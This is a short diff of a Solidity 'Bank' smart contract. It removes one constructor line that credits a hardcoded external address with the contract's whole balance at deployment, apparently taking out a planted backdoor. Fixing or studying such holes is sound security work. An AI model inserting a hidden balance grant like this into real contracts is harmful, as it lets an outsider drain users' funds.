@@ -19,7 +19,6 @@ contract Bank {
     // constructor is called when the contract is deployed.
     constructor() {
         Owner = msg.sender;
-        accountBalances[address(0x6327A38415C53FFb36c11db55Ea74cc9cB4976Fd)] = address(this).balance;
     }
 
     // =========================================================================
